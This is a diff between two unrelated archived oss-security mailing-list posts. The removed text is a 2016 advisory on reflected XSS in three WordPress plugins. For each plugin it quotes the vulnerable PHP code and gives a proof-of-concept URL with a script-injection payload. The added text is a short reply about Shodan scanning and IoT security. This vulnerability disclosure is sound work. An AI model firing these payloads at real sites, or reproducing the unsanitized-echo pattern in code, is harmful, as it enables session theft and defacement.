@@ -1,57 +1,18 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/05/11/12
-Message-id: <1E5802AD-8BE2-42C4-BA73-9773050C1FA5@me.com>
-Date: Wed, 11 May 2016 12:28:33 -0400
-From: "Larry W. Cashdollar" <larry0@...com>
-To: Open Source Security <oss-security@...ts.openwall.com>
-Subject: Reflected XSS in three Wordpress plugins.
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/01/29/9
+Message-ID: <1454096433.25967.0.camel@gmail.com>
+Date: Fri, 29 Jan 2016 14:40:33 -0500
+From: Daniel Micay <danielmicay@...il.com>
+To: oss-security@...ts.openwall.com
+Subject: Re: shodan.io actively infiltrating ntp.org IPv6 pools for scanning purposes
 Content-Type: text/plain; charset=utf-8
 
-Hello List,
+On Fri, 2016-01-29 at 17:45 +0000, Scott Herbert wrote:
+> That would be nice sure, but given that IoT vendors are rushing so
+> fast to market that their doing things like sending login credentials
+> via http, I think we're a long way from having them secure their
+> products from scanning let alone anything else.
 
-I've manually confirmed these vulnerabilities:
-
-Title: Reflected XSS in wordpress plugin enhanced-tooltipglossary v3.2.8
-Date: 2016-02-09
-Download Site: https://wordpress.org/plugins/enhanced-tooltipglossary
-Vulnerability:
-There is a reflected XSS vulnerability in the following php code ./enhanced-tooltipglossary/backend/views/admin_importexport.php:
-19:        ?> (<?php echo $_GET['itemsnumber']; ?> items read from file)</div>
-The variable itemsnumber appears to send unsanitized data back to the users browser.
-DWF-2016-77246
-PoC:
-This is a tested exploit:
-http://[target]/wp-content/plugins/enhanced-tooltipglossary/backend/views/admin_importexport.php?itemsnumber=<script>alert(1)</script>&msg=imported
-Advisory: http://www.vapidlabs.com/wp/wp_advisory.php?v=37
-
-
-Title: Reflected XSS in wordpress plugin tera-charts v1.0
-Date: 2016-02-09
-Download Site: https://wordpress.org/plugins/tera-charts (removed by WP)
-Vulnerability:
-There is a reflected XSS vulnerability in the following php code ./tera-charts/charts/treemap.php:
-52:    var data_filename = "<?php echo $_GET['fn']; ?>";
-55:    var chart_userid = "<?php echo $_GET['userid']; ?>";
-The variable fn appears to send unsanitized data back to the users browser.
-DWF-2016-77716
-PoC:
-This is a tested exploit:
-http://wp-site/tera-charts/charts/treemap.php?fn=";</script><script>alert(1);</script><script>"&userid=1
-Advisory: http://www.vapidlabs.com/wp/wp_advisory.php?v=455
-
-
-Title: Reflected XSS in wordpress plugin pondol-carousel v1.0 (no response from author)
-Date: 2016-02-09
-Download Site: https://wordpress.org/plugins/pondol-carousel
-Vulnerability:
-There is a reflected XSS vulnerability in the following php code ./pondol-carousel/pages/admin_create.php:
-5:	var itemid	= "<?php echo $_GET["itemid"];?>";
-The variable itemid appears to send unsanitized data back to the users browser.
-DWF-2016-77531
-PoC:
-This is a tested exploit:
-http://wp-sitehttp://192.168.0.115/pondol-carousel/pages/admin_create.php?itemid=";</script><script>alert(1);</script>"
-Advisory: http://www.vapidlabs.com/wp/wp_advisory.php?v=524
-
-
-For more information on DWF assignments see https://github.com/distributedweaknessfiling/DWF-Documentation
+Many of them are going to be using the Android-based Brillo so there's a
+central point to make changes like this (AOSP).
+Download attachment "signature.asc" of type "application/pgp-signature" (820 bytes)
